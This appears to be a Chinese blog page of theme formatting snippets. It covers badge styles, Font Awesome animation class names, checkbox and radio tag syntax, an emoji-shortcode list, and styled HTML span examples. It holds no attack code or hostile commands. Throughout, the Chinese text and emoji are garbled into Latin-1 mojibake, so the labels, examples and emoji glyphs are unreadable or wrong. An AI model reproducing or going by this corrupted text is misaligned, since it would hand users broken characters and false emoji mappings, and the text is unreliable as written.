å¸¸ç”¨æ¨¡æ¿ï¼ˆå¤æ‚åº¦ï¼‰ ?style=plastic&amp;logo=appveyor ?style=flat&amp;logo=appveyor ?style=flat-square&amp;logo=appveyor ?style=for-the-badge&amp;logo=appveyor ?style=social&amp;logo=appveyor å…¶ä»–å¿«æ·æ–¹å¼ _ /* default */ default /* success */ success /* primary */ primary /* info */ info /* warning */ warning /* danger */ danger åŠ¨ç”» éœ€è¦æ³¨æ„çš„æ˜¯åœ¨ä½¿ç”¨æ—¶éœ€è¦æ·»åŠ fasçš„å±æ€§ï¼Œå¦‚&lt;span class=&quot;fas faa-wrench animated&quot;&gt;&lt;/span&gt; å°åº·åšå®¢ On DOM load On hover On parent hover faa-wrench animated faa-wrench animated-hover faa-wrench faa-ring animated faa-ring animated-hover faa-ring faa-horizontal animated faa-horizontal animated-hover faa-horizontal faa-vertical animated faa-vertical animated-hover faa-vertical faa-flash animated faa-flash animated-hover faa-flash faa-bounce animated faa-bounce animated-hover faa-bounce faa-spin animated faa-spin animated-hover faa-spin faa-float animated faa-float animated-hover faa-float faa-pulse animated faa-pulse animated-hover faa-pulse faa-shake animated faa-shake animated-hover faa-shake faa-tada animated faa-tada animated-hover faa-tada faa-passing animated faa-passing animated-hover faa-passing faa-passing-reverse animated faa-passing-reverse animated-hover faa-passing-reverse faa-burst animated faa-burst animated-hover faa-burst faa-falling animated faa-falling animated-hover faa-falling faa-rising animated faa-rising animated-hover faa-rising å¤–æŒ‚æ ‡ç­¾ checkbox 1234567891011121314151617&#123;% checkbox çº¯æ–‡æœ¬æµ‹è¯• %&#125;&#123;% checkbox checked, æ”¯æŒç®€å•çš„ [markdown](https://guides.github.com/features/mastering-markdown/) è¯­æ³• %&#125;&#123;% checkbox red, æ”¯æŒè‡ªå®šä¹‰é¢œè‰² %&#125;&#123;% checkbox green checked, ç»¿è‰² + é»˜è®¤é€‰ä¸­ %&#125;&#123;% checkbox yellow checked, é»„è‰² + é»˜è®¤é€‰ä¸­ %&#125;&#123;% checkbox cyan checked, é’è‰² + é»˜è®¤é€‰ä¸­ %&#125;&#123;% checkbox blue checked, è“è‰² + é»˜è®¤é€‰ä¸­ %&#125;&#123;% checkbox plus green checked, å¢åŠ  %&#125;&#123;% checkbox minus yellow checked, å‡å°‘ %&#125;&#123;% checkbox times red checked, å‰ %&#125;&#123;% radio çº¯æ–‡æœ¬æµ‹è¯• %&#125;&#123;% radio checked, æ”¯æŒç®€å•çš„ [markdown](https://guides.github.com/features/mastering-markdown/) è¯­æ³• %&#125;&#123;% radio red, æ”¯æŒè‡ªå®šä¹‰é¢œè‰² %&#125;&#123;% radio green, ç»¿è‰² %&#125;&#123;% radio yellow, é»„è‰² %&#125;&#123;% radio cyan, é’è‰² %&#125;&#123;% radio blue, è“è‰² %&#125; æ‰€æœ‰è¡¨æƒ… ğŸ…°ï¸ ğŸ† ğŸ”¤ ğŸ”¡ ğŸ‰‘ ğŸš¡ ğŸ‡¦ğŸ‡« âœˆï¸ ğŸ‡¨ğŸ‡« ğŸŒ ğŸ‡¿ğŸ‡¦ ğŸ‡¦ğŸ‡½ â° âš—ï¸ ğŸ˜„ :smile: ğŸ˜† :laughing: ğŸ˜Š :blush: ğŸ˜ƒ :smiley: â˜ºï¸ :relaxed: ğŸ˜ :smirk: ğŸ˜ :heart_eyes: ğŸ˜˜ :kissing_heart: ğŸ˜š :kissing_closed_eyes: ğŸ˜³ :flushed: ğŸ˜Œ :relieved: ğŸ˜† :satisfied: ğŸ˜ :grin: ğŸ˜‰ :wink: ğŸ˜œ :stuck_out_tongue_winking_eye: ğŸ˜ :stuck_out_tongue_closed_eyes: ğŸ˜€ :grinning: ğŸ˜— :kissing: ğŸ˜™ :kissing_smiling_eyes: ğŸ˜› :stuck_out_tongue: ğŸ˜´ :sleeping: ğŸ˜Ÿ :worried: ğŸ˜¦ :frowning: ğŸ˜§ :anguished: ğŸ˜® :open_mouth: ğŸ˜¬ :grimacing: ğŸ˜• :confused: ğŸ˜¯ :hushed: ğŸ˜‘ :expressionless: ğŸ˜’ :unamused: ğŸ˜… :sweat_smile: ğŸ˜“ :sweat: ğŸ˜¥ :disappointed_relieved: ğŸ˜© :weary: ğŸ˜” :pensive: ğŸ˜ :disappointed: ğŸ˜– :confounded: ğŸ˜¨ :fearful: ğŸ˜° :cold_sweat: ğŸ˜£ :persevere: ğŸ˜¢ :cry: ğŸ˜­ :sob: ğŸ˜‚ :joy: ğŸ˜² :astonished: ğŸ˜± :scream: ğŸ˜« :tired_face: ğŸ˜  :angry: ğŸ˜¡ :rage: ğŸ˜¤ :triumph: ğŸ˜ª :sleepy: ğŸ˜‹ :yum: ğŸ˜· :mask: ğŸ˜ :sunglasses: ğŸ˜µ :dizzy_face: ğŸ‘¿ :imp: ğŸ˜ˆ :smiling_imp: ğŸ˜ :neutral_face: ğŸ˜¶ :no_mouth: ğŸ˜‡ :innocent: ğŸ‘½ :alien: ğŸ’› :yellow_heart: ğŸ’™ :blue_heart: ğŸ’œ :purple_heart: â¤ï¸ :heart: ğŸ’š :green_heart: ğŸ’” :broken_heart: ğŸ’“ :heartbeat: ğŸ’— :heartpulse: ğŸ’• :two_hearts: ğŸ’ :revolving_hearts: ğŸ’˜ :cupid: ğŸ’– :sparkling_heart: âœ¨ :sparkles: â­ï¸ :star: ğŸŒŸ :star2: ğŸ’« :dizzy: ğŸ’¥ :boom: ğŸ’¥ :collision: ğŸ’¢ :anger: â—ï¸ :exclamation: â“ :question: â• :grey_exclamation: â” :grey_question: ğŸ’¤ :zzz: ğŸ’¨ :dash: ğŸ’¦ :sweat_drops: ğŸ¶ :notes: ğŸµ :musical_note: ğŸ”¥ :fire: ğŸ’© :hankey: ğŸ’© :poop: ğŸ’© :shit: ğŸ‘ :+1: ğŸ‘ :thumbsup: ğŸ‘ :-1: ğŸ‘ :thumbsdown: ğŸ‘Œ :ok_hand: ğŸ‘Š :punch: ğŸ‘Š :facepunch: âœŠ :fist: âœŒï¸ :v: ğŸ‘‹ :wave: âœ‹ :hand: âœ‹ :raised_hand: ğŸ‘ :open_hands: â˜ï¸ :point_up: ğŸ‘‡ :point_down: ğŸ‘ˆ :point_left: ğŸ‘‰ :point_right: ğŸ™Œ :raised_hands: ğŸ™ :pray: ğŸ‘† :point_up_2: ğŸ‘ :clap: ğŸ’ª :muscle: ğŸ¤˜ :metal: ğŸ–• :fu: ğŸš¶ :walking: ğŸƒ :runner: ğŸƒ :running: ğŸ‘« :couple: ğŸ‘ª :family: ğŸ‘¬ :two_men_holding_hands: ğŸ‘­ :two_women_holding_hands: ğŸ’ƒ :dancer: ğŸ‘¯ :dancers: ğŸ™† :ok_woman: ğŸ™… :no_good: ğŸ’ :information_desk_person: ğŸ™‹ :raising_hand: ğŸ‘° :bride_with_veil: ğŸ™ :person_with_pouting_face: ğŸ™ :person_frowning: ğŸ™‡ :bow: ğŸ’ :couplekiss: ğŸ’‘ :couple_with_heart: ğŸ’† :massage: ğŸ’‡ :haircut: ğŸ’… :nail_care: ğŸ‘¦ :boy: ğŸ‘§ :girl: ğŸ‘© :woman: ğŸ‘¨ :man: ğŸ‘¶ :baby: ğŸ‘µ :older_woman: ğŸ‘´ :older_man: ğŸ‘± :person_with_blond_hair: ğŸ‘² :man_with_gua_pi_mao: ğŸ‘³ :man_with_turban: ğŸ‘· :construction_worker: ğŸ‘® :cop: ğŸ‘¼ :angel: ğŸ‘¸ :princess: ğŸ˜º :smiley_cat: ğŸ˜¸ :smile_cat: ğŸ˜» :heart_eyes_cat: ğŸ˜½ :kissing_cat: ğŸ˜¼ :smirk_cat: ğŸ™€ :scream_cat: ğŸ˜¿ :crying_cat_face: ğŸ˜¹ :joy_cat: ğŸ˜¾ :pouting_cat: ğŸ‘¹ :japanese_ogre: ğŸ‘º :japanese_goblin: ğŸ™ˆ :see_no_evil: ğŸ™‰ :hear_no_evil: ğŸ™Š :speak_no_evil: ğŸ’‚ :guardsman: ğŸ’€ :skull: ğŸ¾ :feet: ğŸ‘„ :lips: ğŸ’‹ :kiss: ğŸ’§ :droplet: ğŸ‘‚ :ear: ğŸ‘€ :eyes: ğŸ‘ƒ :nose: ğŸ‘… :tongue: ğŸ’Œ :love_letter: ğŸ‘¤ :bust_in_silhouette: ğŸ‘¥ :busts_in_silhouette: ğŸ’¬ :speech_balloon: ğŸ’­ :thought_balloon: Nature â˜€ï¸ :sunny: â˜”ï¸ :umbrella: â˜ï¸ :cloud: â„ï¸ :snowflake: â›„ï¸ :snowman: âš¡ï¸ :zap: ğŸŒ€ :cyclone: ğŸŒ :foggy: ğŸŒŠ :ocean: ğŸ± :cat: ğŸ¶ :dog: ğŸ­ :mouse: ğŸ¹ :hamster: ğŸ° :rabbit: ğŸº :wolf: ğŸ¸ :frog: ğŸ¯ :tiger: ğŸ¨ :koala: ğŸ» :bear: ğŸ· :pig: ğŸ½ :pig_nose: ğŸ® :cow: ğŸ— :boar: ğŸµ :monkey_face: ğŸ’ :monkey: ğŸ´ :horse: ğŸ :racehorse: ğŸ« :camel: ğŸ‘ :sheep: ğŸ˜ :elephant: ğŸ¼ :panda_face: ğŸ :snake: ğŸ¦ :bird: ğŸ¤ :baby_chick: ğŸ¥ :hatched_chick: ğŸ£ :hatching_chick: ğŸ” :chicken: ğŸ§ :penguin: ğŸ¢ :turtle: ğŸ› :bug: ğŸ :honeybee: ğŸœ :ant: ğŸ :beetle: ğŸŒ :snail: ğŸ™ :octopus: ğŸ  :tropical_fish: ğŸŸ :fish: ğŸ³ :whale: ğŸ‹ :whale2: ğŸ¬ :dolphin: ğŸ„ :cow2: ğŸ :ram: ğŸ€ :rat: ğŸƒ :water_buffalo: ğŸ… :tiger2: ğŸ‡ :rabbit2: ğŸ‰ :dragon: ğŸ :goat: ğŸ“ :rooster: ğŸ• :dog2: ğŸ– :pig2: ğŸ :mouse2: ğŸ‚ :ox: ğŸ² :dragon_face: ğŸ¡ :blowfish: ğŸŠ :crocodile: ğŸª :dromedary_camel: ğŸ† :leopard: ğŸˆ :cat2: ğŸ© :poodle: ğŸ¾ :paw_prints: ğŸ’ :bouquet: ğŸŒ¸ :cherry_blossom: ğŸŒ· :tulip: ğŸ€ :four_leaf_clover: ğŸŒ¹ :rose: ğŸŒ» :sunflower: ğŸŒº :hibiscus: ğŸ :maple_leaf: ğŸƒ :leaves: ğŸ‚ :fallen_leaf: ğŸŒ¿ :herb: ğŸ„ :mushroom: ğŸŒµ :cactus: ğŸŒ´ :palm_tree: ğŸŒ² :evergreen_tree: ğŸŒ³ :deciduous_tree: ğŸŒ° :chestnut: ğŸŒ± :seedling: ğŸŒ¼ :blossom: ğŸŒ¾ :ear_of_rice: ğŸš :shell: ğŸŒ :globe_with_meridians: ğŸŒ :sun_with_face: ğŸŒ :full_moon_with_face: ğŸŒš :new_moon_with_face: ğŸŒ‘ :new_moon: ğŸŒ’ :waxing_crescent_moon: ğŸŒ“ :first_quarter_moon: ğŸŒ” :waxing_gibbous_moon: ğŸŒ• :full_moon: ğŸŒ– :waning_gibbous_moon: ğŸŒ— :last_quarter_moon: ğŸŒ˜ :waning_crescent_moon: ğŸŒœ :last_quarter_moon_with_face: ğŸŒ› :first_quarter_moon_with_face: ğŸŒ” :moon: ğŸŒ :earth_africa: ğŸŒ :earth_americas: ğŸŒ :earth_asia: ğŸŒ‹ :volcano: ğŸŒŒ :milky_way: â›…ï¸ :partly_sunny: Objects ğŸ :bamboo: ğŸ’ :gift_heart: ğŸ :dolls: ğŸ’ :school_satchel: ğŸ“ :mortar_board: ğŸ :flags: ğŸ† :fireworks: ğŸ‡ :sparkler: ğŸ :wind_chime: ğŸ‘ :rice_scene: ğŸƒ :jack_o_lantern: ğŸ‘» :ghost: ğŸ… :santa: ğŸ„ :christmas_tree: ğŸ :gift: ğŸ”” :bell: ğŸ”• :no_bell: ğŸ‹ :tanabata_tree: ğŸ‰ :tada: ğŸŠ :confetti_ball: ğŸˆ :balloon: ğŸ”® :crystal_ball: ğŸ’¿ :cd: ğŸ“€ :dvd: ğŸ’¾ :floppy_disk: ğŸ“· :camera: ğŸ“¹ :video_camera: ğŸ¥ :movie_camera: ğŸ’» :computer: ğŸ“º :tv: ğŸ“± :iphone: â˜ï¸ :phone: â˜ï¸ :telephone: ğŸ“ :telephone_receiver: ğŸ“Ÿ :pager: ğŸ“  :fax: ğŸ’½ :minidisc: ğŸ“¼ :vhs: ğŸ”‰ :sound: ğŸ”ˆ :speaker: ğŸ”‡ :mute: ğŸ“¢ :loudspeaker: ğŸ“£ :mega: âŒ›ï¸ :hourglass: â³ :hourglass_flowing_sand: â° :alarm_clock: âŒšï¸ :watch: ğŸ“» :radio: ğŸ“¡ :satellite: â¿ :loop: ğŸ” :mag: ğŸ” :mag_right: ğŸ”“ :unlock: ğŸ”’ :lock: ğŸ” :lock_with_ink_pen: ğŸ” :closed_lock_with_key: ğŸ”‘ :key: ğŸ’¡ :bulb: ğŸ”¦ :flashlight: ğŸ”† :high_brightness: ğŸ”… :low_brightness: ğŸ”Œ :electric_plug: ğŸ”‹ :battery: ğŸ“² :calling: âœ‰ï¸ :email: ğŸ“« :mailbox: ğŸ“® :postbox: ğŸ›€ :bath: ğŸ› :bathtub: ğŸš¿ :shower: ğŸš½ :toilet: ğŸ”§ :wrench: ğŸ”© :nut_and_bolt: ğŸ”¨ :hammer: ğŸ’º :seat: ğŸ’° :moneybag: ğŸ’´ :yen: ğŸ’µ :dollar: ğŸ’· :pound: ğŸ’¶ :euro: ğŸ’³ :credit_card: ğŸ’¸ :money_with_wings: ğŸ“§ :e-mail: ğŸ“¥ :inbox_tray: ğŸ“¤ :outbox_tray: âœ‰ï¸ :envelope: ğŸ“¨ :incoming_envelope: ğŸ“¯ :postal_horn: ğŸ“ª :mailbox_closed: ğŸ“¬ :mailbox_with_mail: ğŸ“­ :mailbox_with_no_mail: ğŸšª :door: ğŸš¬ :smoking: ğŸ’£ :bomb: ğŸ”« :gun: ğŸ”ª :hocho: ğŸ’Š :pill: ğŸ’‰ :syringe: ğŸ“„ :page_facing_up: ğŸ“ƒ :page_with_curl: ğŸ“‘ :bookmark_tabs: ğŸ“Š :bar_chart: ğŸ“ˆ :chart_with_upwards_trend: ğŸ“‰ :chart_with_downwards_trend: ğŸ“œ :scroll: ğŸ“‹ :clipboard: ğŸ“† :calendar: ğŸ“… :date: ğŸ“‡ :card_index: ğŸ“ :file_folder: ğŸ“‚ :open_file_folder: âœ‚ï¸ :scissors: ğŸ“Œ :pushpin: ğŸ“ :paperclip: âœ’ï¸ :black_nib: âœï¸ :pencil2: ğŸ“ :straight_ruler: ğŸ“ :triangular_ruler: ğŸ“• :closed_book: ğŸ“— :green_book: ğŸ“˜ :blue_book: ğŸ“™ :orange_book: ğŸ““ :notebook: ğŸ“” :notebook_with_decorative_cover: ğŸ“’ :ledger: ğŸ“š :books: ğŸ”– :bookmark: ğŸ“› :name_badge: ğŸ”¬ :microscope: ğŸ”­ :telescope: ğŸ“° :newspaper: ğŸˆ :football: ğŸ€ :basketball: âš½ï¸ :soccer: âš¾ï¸ :baseball: ğŸ¾ :tennis: ğŸ± :8ball: ğŸ‰ :rugby_football: ğŸ³ :bowling: â›³ï¸ :golf: ğŸšµ :mountain_bicyclist: ğŸš´ :bicyclist: ğŸ‡ :horse_racing: ğŸ‚ :snowboarder: ğŸŠ :swimmer: ğŸ„ :surfer: ğŸ¿ :ski: â™ ï¸ :spades: â™¥ï¸ :hearts: â™£ï¸ :clubs: â™¦ï¸ :diamonds: ğŸ’ :gem: ğŸ’ :ring: ğŸ† :trophy: ğŸ¼ :musical_score: ğŸ¹ :musical_keyboard: ğŸ» :violin: ğŸ‘¾ :space_invader: ğŸ® :video_game: ğŸƒ :black_joker: ğŸ´ :flower_playing_cards: ğŸ² :game_die: ğŸ¯ :dart: ğŸ€„ï¸ :mahjong: ğŸ¬ :clapper: ğŸ“ :memo: ğŸ“ :pencil: ğŸ“– :book: ğŸ¨ :art: ğŸ¤ :microphone: ğŸ§ :headphones: ğŸº :trumpet: ğŸ· :saxophone: ğŸ¸ :guitar: ğŸ‘ :shoe: ğŸ‘¡ :sandal: ğŸ‘  :high_heel: ğŸ’„ :lipstick: ğŸ‘¢ :boot: ğŸ‘• :shirt: ğŸ‘• :tshirt: ğŸ‘” :necktie: ğŸ‘š :womans_clothes: ğŸ‘— :dress: ğŸ½ :running_shirt_with_sash: ğŸ‘– :jeans: ğŸ‘˜ :kimono: ğŸ‘™ :bikini: ğŸ€ :ribbon: ğŸ© :tophat: ğŸ‘‘ :crown: ğŸ‘’ :womans_hat: ğŸ‘ :mans_shoe: ğŸŒ‚ :closed_umbrella: ğŸ’¼ :briefcase: ğŸ‘œ :handbag: ğŸ‘ :pouch: ğŸ‘› :purse: ğŸ‘“ :eyeglasses: ğŸ£ :fishing_pole_and_fish: â˜•ï¸ :coffee: ğŸµ :tea: ğŸ¶ :sake: ğŸ¼ :baby_bottle: ğŸº :beer: ğŸ» :beers: ğŸ¸ :cocktail: ğŸ¹ :tropical_drink: ğŸ· :wine_glass: ğŸ´ :fork_and_knife: ğŸ• :pizza: ğŸ” :hamburger: ğŸŸ :fries: ğŸ— :poultry_leg: ğŸ– :meat_on_bone: ğŸ :spaghetti: ğŸ› :curry: ğŸ¤ :fried_shrimp: ğŸ± :bento: ğŸ£ :sushi: ğŸ¥ :fish_cake: ğŸ™ :rice_ball: ğŸ˜ :rice_cracker: ğŸš :rice: ğŸœ :ramen: ğŸ² :stew: ğŸ¢ :oden: ğŸ¡ :dango: ğŸ¥š :egg: ğŸ :bread: ğŸ© :doughnut: ğŸ® :custard: ğŸ¦ :icecream: ğŸ¨ :ice_cream: ğŸ§ :shaved_ice: ğŸ‚ :birthday: ğŸ° :cake: ğŸª :cookie: ğŸ« :chocolate_bar: ğŸ¬ :candy: ğŸ­ :lollipop: ğŸ¯ :honey_pot: ğŸ :apple: ğŸ :green_apple: ğŸŠ :tangerine: ğŸ‹ :lemon: ğŸ’ :cherries: ğŸ‡ :grapes: ğŸ‰ :watermelon: ğŸ“ :strawberry: ğŸ‘ :peach: ğŸˆ :melon: ğŸŒ :banana: ğŸ :pear: ğŸ :pineapple: ğŸ  :sweet_potato: ğŸ† :eggplant: ğŸ… :tomato: ğŸŒ½ :corn: Places ğŸ  :house: ğŸ¡ :house_with_garden: ğŸ« :school: ğŸ¢ :office: ğŸ£ :post_office: ğŸ¥ :hospital: ğŸ¦ :bank: ğŸª :convenience_store: ğŸ© :love_hotel: ğŸ¨ :hotel: ğŸ’’ :wedding: â›ªï¸ :church: ğŸ¬ :department_store: ğŸ¤ :european_post_office: ğŸŒ‡ :city_sunrise: ğŸŒ† :city_sunset: ğŸ¯ :japanese_castle: ğŸ° :european_castle: â›ºï¸ :tent: ğŸ­ :factory: ğŸ—¼ :tokyo_tower: ğŸ—¾ :japan: ğŸ—» :mount_fuji: ğŸŒ„ :sunrise_over_mountains: ğŸŒ… :sunrise: ğŸŒ  :stars: ğŸ—½ :statue_of_liberty: ğŸŒ‰ :bridge_at_night: ğŸ  :carousel_horse: ğŸŒˆ :rainbow: ğŸ¡ :ferris_wheel: â›²ï¸ :fountain: ğŸ¢ :roller_coaster: ğŸš¢ :ship: ğŸš¤ :speedboat: â›µï¸ :boat: â›µï¸ :sailboat: ğŸš£ :rowboat: âš“ï¸ :anchor: ğŸš€ :rocket: âœˆï¸ :airplane: ğŸš :helicopter: ğŸš‚ :steam_locomotive: ğŸšŠ :tram: ğŸš :mountain_railway: ğŸš² :bike: ğŸš¡ :aerial_tramway: ğŸšŸ :suspension_railway: ğŸš  :mountain_cableway: ğŸšœ :tractor: ğŸš™ :blue_car: ğŸš˜ :oncoming_automobile: ğŸš— :car: ğŸš— :red_car: ğŸš• :taxi: ğŸš– :oncoming_taxi: ğŸš› :articulated_lorry: ğŸšŒ :bus: ğŸš :oncoming_bus: ğŸš¨ :rotating_light: ğŸš“ :police_car: ğŸš” :oncoming_police_car: ğŸš’ :fire_engine: ğŸš‘ :ambulance: ğŸš :minibus: ğŸšš :truck: ğŸš‹ :train: ğŸš‰ :station: ğŸš† :train2: ğŸš… :bullettrain_front: ğŸš„ :bullettrain_side: ğŸšˆ :light_rail: ğŸš :monorail: ğŸšƒ :railway_car: ğŸš :trolleybus: ğŸ« :ticket: â›½ï¸ :fuelpump: ğŸš¦ :vertical_traffic_light: ğŸš¥ :traffic_light: âš ï¸ :warning: ğŸš§ :construction: ğŸ”° :beginner: ğŸ§ :atm: ğŸ° :slot_machine: ğŸš :busstop: ğŸ’ˆ :barber: â™¨ï¸ :hotsprings: ğŸ :checkered_flag: ğŸŒ :crossed_flags: ğŸ® :izakaya_lantern: ğŸ—¿ :moyai: ğŸª :circus_tent: ğŸ­ :performing_arts: ğŸ“ :round_pushpin: ğŸš© :triangular_flag_on_post: ğŸ‡¯ğŸ‡µ :jp: ğŸ‡°ğŸ‡· :kr: ğŸ‡¨ğŸ‡³ :cn: ğŸ‡ºğŸ‡¸ :us: ğŸ‡«ğŸ‡· :fr: ğŸ‡ªğŸ‡¸ :es: ğŸ‡®ğŸ‡¹ :it: ğŸ‡·ğŸ‡º :ru: ğŸ‡¬ğŸ‡§ :gb: ğŸ‡¬ğŸ‡§ :uk: ğŸ‡©ğŸ‡ª :de: Symbols 1ï¸âƒ£ :one: 2ï¸âƒ£ :two: 3ï¸âƒ£ :three: 4ï¸âƒ£ :four: 5ï¸âƒ£ :five: 6ï¸âƒ£ :six: 7ï¸âƒ£ :seven: 8ï¸âƒ£ :eight: 9ï¸âƒ£ :nine: ğŸ”Ÿ :keycap_ten: ğŸ”¢ :1234: 0ï¸âƒ£ :zero: #ï¸âƒ£ :hash: ğŸ”£ :symbols: â—€ï¸ :arrow_backward: â¬‡ï¸ :arrow_down: â–¶ï¸ :arrow_forward: â¬…ï¸ :arrow_left: ğŸ”  :capital_abcd: ğŸ”¡ :abcd: ğŸ”¤ :abc: â†™ï¸ :arrow_lower_left: â†˜ï¸ :arrow_lower_right: â¡ï¸ :arrow_right: â¬†ï¸ :arrow_up: â†–ï¸ :arrow_upper_left: â†—ï¸ :arrow_upper_right: â¬ :arrow_double_down: â« :arrow_double_up: ğŸ”½ :arrow_down_small: â¤µï¸ :arrow_heading_down: â¤´ï¸ :arrow_heading_up: â†©ï¸:leftwards_arrow_with_hook: â†ªï¸ :arrow_right_hook: â†”ï¸ :left_right_arrow: â†•ï¸ :arrow_up_down: ğŸ”¼ :arrow_up_small: ğŸ”ƒ :arrows_clockwise: ğŸ”„ :arrows_counterclockwise: âª :rewind: â© :fast_forward: â„¹ï¸ :information_source: ğŸ†— :ok: ğŸ”€ :twisted_rightwards_arrows: ğŸ” :repeat: ğŸ”‚ :repeat_one: ğŸ†• :new: ğŸ” :top: ğŸ†™ :up: ğŸ†’ :cool: ğŸ†“ :free: ğŸ†– :ng: ğŸ¦ :cinema: ğŸˆ :koko: ğŸ“¶ :signal_strength: ğŸˆ¹ :u5272: ğŸˆ´ :u5408: ğŸˆº :u55b6: ğŸˆ¯ï¸ :u6307: ğŸˆ·ï¸ :u6708: ğŸˆ¶ :u6709: ğŸˆµ :u6e80: ğŸˆšï¸ :u7121: ğŸˆ¸ :u7533: ğŸˆ³ :u7a7a: ğŸˆ² :u7981: ğŸˆ‚ï¸ :sa: ğŸš» :restroom: ğŸš¹ :mens: ğŸšº :womens: ğŸš¼ :baby_symbol: ğŸš­ :no_smoking: ğŸ…¿ï¸ :parking: â™¿ï¸ :wheelchair: ğŸš‡ :metro: ğŸ›„ :baggage_claim: ğŸ‰‘ :accept: ğŸš¾ :wc: ğŸš° :potable_water: ğŸš® :put_litter_in_its_place: ãŠ™ï¸ :secret: ãŠ—ï¸ :congratulations: â“‚ï¸ :m: ğŸ›‚ :passport_control: ğŸ›… :left_luggage: ğŸ›ƒ :customs: ğŸ‰ :ideograph_advantage: ğŸ†‘ :cl: ğŸ†˜ :sos: ğŸ†” :id: ğŸš« :no_entry_sign: ğŸ” :underage: ğŸ“µ :no_mobile_phones: ğŸš¯ :do_not_litter: ğŸš± :non-potable_water: ğŸš³ :no_bicycles: ğŸš· :no_pedestrians: ğŸš¸ :children_crossing: â›”ï¸ :no_entry: âœ³ï¸ :eight_spoked_asterisk: âœ´ï¸ :eight_pointed_black_star: ğŸ’Ÿ :heart_decoration: ğŸ†š :vs: ğŸ“³ :vibration_mode: ğŸ“´ :mobile_phone_off: ğŸ’¹ :chart: ğŸ’± :currency_exchange: â™ˆï¸ :aries: â™‰ï¸ :taurus: â™Šï¸ :gemini: â™‹ï¸ :cancer: â™Œï¸ :leo: â™ï¸ :virgo: â™ï¸ :libra: â™ï¸ :scorpius: â™ï¸ :sagittarius: â™‘ï¸ :capricorn: â™’ï¸ :aquarius: â™“ï¸ :pisces: â› :ophiuchus: ğŸ”¯ :six_pointed_star: â:negative_squared_cross_mark: ğŸ…°ï¸ :a: ğŸ…±ï¸ :b: ğŸ† :ab: ğŸ…¾ï¸ :o2: ğŸ’ :diamond_shape_with_a_dot_inside: â™»ï¸ :recycle: ğŸ”š :end: ğŸ”› :on: ğŸ”œ :soon: ğŸ• :clock1: ğŸ•œ :clock130: ğŸ•™ :clock10: ğŸ•¥ :clock1030: ğŸ•š :clock11: ğŸ•¦ :clock1130: ğŸ•› :clock12: ğŸ•§ :clock1230: ğŸ•‘ :clock2: ğŸ• :clock230: ğŸ•’ :clock3: ğŸ• :clock330: ğŸ•“ :clock4: ğŸ•Ÿ :clock430: ğŸ•” :clock5: ğŸ•  :clock530: ğŸ•• :clock6: ğŸ•¡ :clock630: ğŸ•– :clock7: ğŸ•¢ :clock730: ğŸ•— :clock8: ğŸ•£ :clock830: ğŸ•˜ :clock9: ğŸ•¤ :clock930: ğŸ’² :heavy_dollar_sign: Â©ï¸ :copyright: Â®ï¸ :registered: â„¢ï¸ :tm: âŒ :x: â—ï¸ :heavy_exclamation_mark: â€¼ï¸ :bangbang: â‰ï¸ :interrobang: â­•ï¸ :o: âœ–ï¸ :heavy_multiplication_x: â• :heavy_plus_sign: â– :heavy_minus_sign: â— :heavy_division_sign: ğŸ’® :white_flower: ğŸ’¯ :100: âœ”ï¸ :heavy_check_mark: â˜‘ï¸ :ballot_box_with_check: ğŸ”˜ :radio_button: ğŸ”— :link: â° :curly_loop: ã€°ï¸ :wavy_dash: ã€½ï¸ :part_alternation_mark: ğŸ”± :trident: :black_square: :black_square: :white_square: :white_square: âœ… :white_check_mark: ğŸ”² :black_square_button: ğŸ”³ :white_square_button: âš«ï¸ :black_circle: âšªï¸ :white_circle: ğŸ”´ :red_circle: ğŸ”µ :large_blue_circle: ğŸ”· :large_blue_diamond: ğŸ”¶ :large_orange_diamond: ğŸ”¹ :small_blue_diamond: ğŸ”¸ :small_orange_diamond: ğŸ”º :small_red_triangle: ğŸ”» :small_red_triangle_down: span list 12345678910111213141516171819202122231&lt;span class=&quot;fas faa-ring animated-hover&quot; style=&quot;border-bottom:3px solid green&quot;&gt;ã€ŠåŠå°æ—¶æ¼«ç”»ä¸­å›½å“²å­¦å²ã€‹&lt;/span&gt;2&lt;span style=&quot;text-align:center;font-size:20px;font:30px ä¹¦ä½“åŠå…°äº­ä½“;color:blueviolent;word-spacing:30px;&quot;&gt;â€œ æ—¢è®¸ä¸€äººä»¥åçˆ±ï¼Œæ„¿å°½ä½™ç”Ÿä¹‹æ…·æ…¨ â€&lt;/span&gt;3&lt;span style=&quot;class: faa-bounce animated-hover;border-bottom: 5px solid #8F81EF;&quot;&gt;[data.jsonæ–‡ä»¶é“¾æ¥](https://pan.baidu.com/s/1omzU65YMpJr0jPPFItZ7SA )&lt;/span&gt; 4 &lt;mark style=&quot;background:royalBlue;border-bottom:lightblue 2px solid;color:white;font-family:consolas&quot;&gt;å½“ä½¿ç”¨é‡åšæ—¥å¿—æ–‡ä»¶æ¥è¿›è¡Œæ•°æ®åº“æ¢å¤æ—¶ï¼ŒORACLEå°†è¯»å–å…¶ä¸­çš„é‡åšè®°å½•(åŒ…æ‹¬å…¶ä¸­çš„ä¿®æ”¹å‘é‡)ï¼Œå¹¶ä¸”å°†è¿™äº›ä¿®æ”¹ç”¨äºç›¸å…³çš„å—ä¸­ã€‚&lt;/mark&gt;5&lt;span style=&quot;background: PaleVioletRed;border-radius:10px;padding:1px 5px;color:white;font-weight:900&quot;&gt;å­˜å‚¨ç»“æ„ç®¡ç†ä¸»è¦å°±æ˜¯é€šè¿‡å¯¹è¡¨ç©ºé—´çš„ç®¡ç†æ¥å®ç°çš„&lt;/span&gt;6&lt;mark style=&quot;background:green;border-radius:10px;color:white&quot;&gt;æ•ˆæœå¦‚ä¸‹ï¼š&lt;/mark&gt;7&lt;font size=10px style=&quot;font-weight:700;font-family:&#x27;åæ–‡å½©äº‘&#x27;;color:rgb(100,190,100)&quot;&gt;åŸºæœ¬è¯­è¨€(ä¸€)&lt;/font&gt;8&lt;span style=&quot;border-bottom: 2px dashed #000000&quot;&gt;ä»£ç æ®µã€æ•°æ®æ®µã€BSSæ®µã€å †åŒºã€æ–‡ä»¶æ˜ å°„åŒºä»¥åŠæ ˆåŒº&lt;/span&gt;9&lt;div style=&quot;background:black;font:conloas;color:white;&quot;&gt;&amp;nbsp;æ•°ç»„é•¿åº¦ä¸ºï¼š3&lt;br&gt;&amp;nbsp;è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . .&lt;/div&gt;10&lt;mark style=&quot;color:white;background:red;font-weight:600;border_radius:100px&quot;&gt;ä½†æ•ˆç‡æ›´é«˜&lt;/mark&gt; ã€ŠåŠå°æ—¶æ¼«ç”»ä¸­å›½å“²å­¦å²ã€‹ â€œ 